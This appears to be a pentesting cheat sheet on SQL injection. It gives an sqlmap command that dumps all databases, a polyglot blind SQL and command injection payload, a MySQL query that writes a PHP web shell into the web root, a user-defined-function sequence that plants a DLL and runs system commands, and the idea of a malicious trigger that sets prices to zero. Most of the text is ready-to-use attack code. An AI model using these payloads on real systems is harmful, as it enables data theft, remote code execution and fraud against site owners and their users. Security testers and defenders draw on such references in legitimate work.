# SQL Injection

## Tools
- SqlMap:
```
sqlmap -r sqlmap.req --level=5 --risk=3 --dump-all​
```
- AutoSQLi: https://github.com/jesuiscamille/AutoSQLi
- SQLiDumper: https://www.cybrary.it/0p3n/pentesting-sqli-dumper-v8-tool/
- Automatic SQL injection with Charles and sqlmap api
  - http://0r1.me/SQLiScanner/
  - https://github.com/0xbug/SQLiScanner

## Payload
Combines blind command injection and blind sql injection ( mysql ) in one payload (works with no quotes/single quotes and double quotes):
```
/*$(sleep 5)`sleep 5``*/sleep(5)#'/*$(sleep 5)`sleep 5` #*/||sleep(5)||'"||sleep(5)||"`
```
> https://mobile.twitter.com/bl4ckh4ck5/status/1100167033407320065

WebShell over MySQL

```
SELECT '<?php echo shell_exec($_GET['c']); ?>' INTO OUTFILE '/var/www/html/example.php'
```

User Defined Functions (UDF) (sqlmap/udf/mysql)

```
SELECT @@plugin_dir;
PowerShell$ Convert-Dll -DllPath lib_mysqludf_sys.dll -OutputPath bytes.txt
SELECT CHAR(64,64,....) INTO OUTFILE '<@@plugin_dir>/lib_mysqludf_sys.dll' FIELDS ESCAPED BY '';
CREATE FUNCTION sys_eval RETURNS STRING SONAME 'lib_mysqludf_sys.dll';
SELECT sys_eval('whoami');
```



## Techniques
- Add a trigger to do a malicious action (price 0)

## Language Specific

### PHP
- Good example from DOCs, where parameterization is not used: http://php.net/manual/en/mysqli.examples-basic.php (use: https://phptherightway.com/)
